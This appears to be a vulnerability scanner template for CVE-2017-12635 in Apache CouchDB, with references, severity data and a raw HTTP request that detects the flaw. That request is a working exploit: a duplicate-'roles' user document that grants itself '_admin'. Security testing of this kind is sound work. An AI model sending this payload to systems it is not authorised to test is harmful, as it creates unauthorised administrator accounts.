id: CVE-2017-12635
info:
  name: Apache CouchDB 1.7.0 / 2.x < 2.1.1 - Remote Privilege Escalation
  author: pikpikcu
  severity: critical
  description: Apache CouchDB versions 1.7.0 and 2.x before 2.1.1 are vulnerable to
    remote privilege escalation, allowing non-admin users to grant themselves admin
    privileges by submitting _users documents with duplicate keys, due to differences
    in the Erlang-based JSON parser and JavaScript-based JSON parser.
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2017-12635
  - https://lists.apache.org/thread.html/6c405bf3f8358e6314076be9f48c89a2e0ddf00539906291ebdf0c67@%3Cdev.couchdb.apache.org%3E
  - http://web.archive.org/web/20210414010253/https://www.securityfocus.com/bid/101868
  - https://security.gentoo.org/glsa/201711-16
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2017-12635
    cwe-id: CWE-269
  tags: cve,cve2017,couchdb,apache
  metadata:
    impact: The impact of CVE-2017-12635 is a remote privilege escalation vulnerability
      that allows non-admin users to give themselves admin privileges by submitting
      _users documents with duplicate keys, which in combination with CVE-2017-12636
      can give non-admin users access to arbitrary shell commands on the server as
      the database system user.
    recommendation: It is recommended to update Apache CouchDB to version 2.1.1 or
      later to prevent remote privilege escalation through CVE-2017-12635 and CVE-2017-12636
      vulnerabilities.
requests:
- raw:
  - "PUT /_users/org.couchdb.user:poc HTTP/1.1\nHost:  {{Hostname}}\nAccept: application/json\n\
    \n{\n  \"type\": \"user\",\n  \"name\": \"poc\",\n  \"roles\": [\"_admin\"],\n\
    \  \"roles\": [],\n  \"password\": \"123456\"\n}\n"
  matchers-condition: and
  matchers:
  - type: word
    part: header
    words:
    - application/json
    - 'Location:'
  - type: word
    part: body
    words:
    - org.couchdb.user:poc
    - conflict
    - Document update conflict
  - type: status
    status:
    - 201
    - 409
